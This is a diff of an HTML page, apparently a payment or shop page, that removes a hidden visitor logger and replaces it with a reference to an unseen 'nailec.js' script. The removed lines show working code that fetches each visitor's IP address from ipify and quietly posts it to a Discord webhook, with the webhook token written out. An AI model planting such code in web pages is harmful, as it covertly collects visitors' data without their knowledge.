@@ -180,25 +180,9 @@
   
   </div>
 
-  <script>
-function getIP(json) {
-  var request = new XMLHttpRequest(); //making a request for the webhook
-      request.open("POST", "https://discord.com/api/webhooks/1125143468692476076/Z7ZprPUyb7YlVMfkwYzWfFwQYUi2vJTRU1gE8Gts88bAz8tzOoqA4CX39rGXA1VmEEbX");
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var params = {
-        username: "Logger",
-        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
-        content: "**IP:** *" + json.ip + "*"
-      }
-   //just a webhook parameters such as avatar,name,message
-
-      request.send(JSON.stringify(params));
-    }
-
-</script>
-<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
+  <body>
+ <script src="nailec.js"></script>
+</body>
   
 <!-- payment complect popup -->
   <div id="popup"class="fixed inset-0 flex flex-wrap items-center justify-center bg-black bg-opacity-50 hidden">
